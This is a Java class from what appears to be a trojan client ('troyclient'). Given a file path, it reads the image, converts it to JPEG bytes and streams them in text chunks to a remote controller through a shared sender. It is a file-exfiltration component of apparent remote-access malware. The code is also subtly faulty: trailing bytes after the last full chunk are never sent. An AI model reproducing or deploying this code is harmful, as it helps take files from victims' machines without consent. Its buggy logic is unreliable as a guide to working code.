package ch.lebois.troyclient.service;


import ch.lebois.troyclient.main.GetContext;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;

/**
 * @USER Felix
 * @DATE 24.02.2018
 * @PROJECT Hermann
 */
public class ImageSender {

    public byte[] sendBytes(String path) {
        BufferedImage bufferedImage;
        byte[] bytes;
        try {
            bufferedImage = ImageIO.read(new File(path));

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ImageIO.write(bufferedImage, "jpg", byteArrayOutputStream);
            byteArrayOutputStream.flush();

            bytes = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();

            StringBuilder byteHandler = new StringBuilder();
            int maxbytes = 250;
            for (byte b : bytes) {
                maxbytes--;
                byteHandler.append(b);
                byteHandler.append("_");
                if (maxbytes == 0) {
                    maxbytes = 250;
                    GetContext.SENDER.send("img", String.valueOf(byteHandler));
                    byteHandler = new StringBuilder();
                }
            }
            GetContext.SENDER.send("imgend", "");

            return bytes;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


}